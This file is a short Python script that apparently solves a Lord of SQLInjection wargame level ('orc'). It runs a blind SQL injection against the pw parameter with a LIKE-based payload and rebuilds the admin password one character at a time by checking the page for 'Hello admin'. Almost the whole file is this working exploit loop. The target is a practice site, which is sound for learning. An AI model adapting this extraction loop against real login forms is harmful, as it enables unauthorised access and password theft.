import requests

start=ord('0')
end=ord('Z')
value = "295d5844"
i = start

url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php"
cookies = {"PHPSESSID":""}

while 1:
	sql = "\' or (id=\'admin\' and pw like \'"+value+chr(i)+"%\') -- \'"
	params = {'pw':sql}
	r = requests.get(url, params=params, cookies=cookies)
	print sql

	i += 1
	if i == 37:		# % 문자 필터링
		i+=1

	if r.text.find("Hello admin") != -1:
		value += chr(i-1)
		i=start
		print "value : "+value
	if i>end:
		break

print "finished : " + value
